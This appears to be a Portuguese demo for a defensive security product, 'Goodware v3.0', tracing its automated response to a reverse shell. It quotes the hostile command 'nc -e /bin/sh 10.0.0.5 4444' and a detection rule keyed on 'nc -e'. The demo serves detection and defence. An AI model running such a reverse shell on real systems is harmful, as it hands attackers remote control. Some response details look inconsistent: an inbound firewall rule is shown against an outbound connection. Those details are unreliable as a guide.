# DEMO PRÁTICA — Goodware v3.0 em ação

## Cenário: Ataque reverse shell às 3h da manhã

```
$ ssh attacker@1.2.3.4
attacker$ nc -e /bin/sh 10.0.0.5 4444
```

## Resposta do Goodware v3.0 (em <500ms)

```
[1] SENSOR (process) detecta anomalia
    pid=4242, name="nc", cmdline="nc -e /bin/sh 10.0.0.5 4444"
    → Emite evento PROCESS_ANOMALY (severity=critical)

[2] EVENT BUS distribui evento aos módulos subscritos

[3] RISK ASSESSOR calcula score
    severity=critical, history=novo processo, parent=bash/ssh
    → score=92/100

[4] ML PREDICTOR confirma
    features: {bind_shell:1, exec_remote_ip:1, user=www-data}
    → probabilidade de breach: 87%

[5] DECISION ENGINE despacha
    rule: IF score>=90 AND cmdline matches reverse_shell_pattern
        THEN firewall.block + quarantine + oob_approval
    → ACCIÓN: dispatch effector

[6] FIREWALL EFFECTOR executa
    $ nft add rule inet filter input ip saddr 10.0.0.5 drop
    → blocking real time

[7] QUARANTINE EFFECTOR executa
    $ mv /usr/bin/nc /quarantine/nc_4242
    $ chmod 000 /quarantine/nc_4242
    → binário isolado

[8] KILL EFFECTOR (se ainda activo)
    $ kill -9 4242
    → processo terminado

[9] PQC ASSINATURA do incident report
    ML-DSA-44 sign(payload=incident_json, sk=incident_signing_key)
    → 2420 bytes signature anexada ao audit log

[10] ENCRYPTA EVIDÊNCIA com Kyber512
    KEM encaps(pk=forensics_key) → ciphertext + shared_secret
    → log encriptado e enviado para cold storage

[11] DEEPSEEK V4.1-Flash analisa
    Input: event payload
    Output: "Detectei uma tentativa de reverse shell...
            O atacante usou nc -e para abrir uma porta de comando
            remoto. Recomendo: 1) investigar web server logs para
            ver como obteve www-data, 2) rodar fail2ban no SSH,
            3) verificar se há outros processos suspeitos"

[12] OOB APPROVAL solicitada para restaurar
    Envia código TOTP via SMS para admin
    Admin aprova com código 847291
    → restore executado

[13] IMMUNE SYSTEM aprende
    Nova regra adicionada:
        IF process.name="nc" AND cmdline contains "-e"
        THEN severity=critical
    → 241ª regra aprendida

[14] FEDERATED LEARNING
    Gradient "nc reverse shell é attack" enviado para servidor central
    Servidor agrega com gradient de outros 5 nós
    → modelo global melhorado
```

## Tempo total: ~470ms

## Output auditável

```
/var/log/goodware/engine.log:
2026-09-26T03:00:00 | CRITICAL | process_sensor | nc -e detected pid=4242
2026-09-26T03:00:00 | INFO    | firewall       | added block rule for 10.0.0.5
2026-09-26T03:00:00 | INFO    | quarantine     | moved /usr/bin/nc → /quarantine/nc_4242
2026-09-26T03:00:00 | INFO    | pqc_sig        | signed incident-2026-09-26T03-00-00 (2420 B)
2026-09-26T03:00:01 | INFO    | llm_brain      | deepseek-v4.1-flash analyzed (387 tok in / 2048 tok out)
2026-09-26T03:00:02 | INFO    | immune         | rule added: nc -e reverse_shell (rule #241)
```

## O que isto significa na prática

- **Detecção**: 0ms (sensor é contínuo)
- **Análise**: ~50ms (rule engine + ML)
- **Resposta**: ~300ms (firewall + quarantine)
- **Audit**: ~120ms (PQC sign + log)
- **Inteligência**: ~1s (LLM call async)

Total até bloqueio efectivo: <500ms
Total até explicação inteligente: <2s

O sistema:
1. **DETECTA** anomalies em tempo real (7 sensores)
2. **CLASSIFICA** risco com ML (predictor + assessor)
3. **RESPONDE** com effector real (nftables, kill, quarantine)
4. **DOCUMENTA** com PQC signing (forward-secure audit)
5. **ANALISA** com LLM (DeepSeek V4.1-Flash)
6. **APRENDE** com immune system + federated
